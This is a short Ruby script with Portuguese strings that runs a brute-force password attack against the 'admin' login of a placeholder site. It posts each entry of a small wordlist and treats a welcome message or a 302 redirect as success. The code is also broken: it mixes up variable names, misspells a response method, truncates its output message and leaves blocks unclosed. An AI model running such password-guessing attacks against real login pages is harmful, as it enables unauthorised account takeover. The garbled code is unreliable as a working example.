require 'net/http'

site = 'http://exemplo.com'
user = 'admin'
lista_senhas = ["1234567", "password", "admin", "senha123", "qwerty","RTX4090super"]  # Wordlist simples


puts ("Iniciando ataque de força bruta...")

lista_senhas.each do |senha| 
  begin 
  url = URI(site)
  res = Net::HTTP.post_form(uri, 'username' => user, 'password' => senha)

 if res.body.include?("Bem vindo admin") || res.cod == "302"
 puts "\n[+] SENHA EN"

end
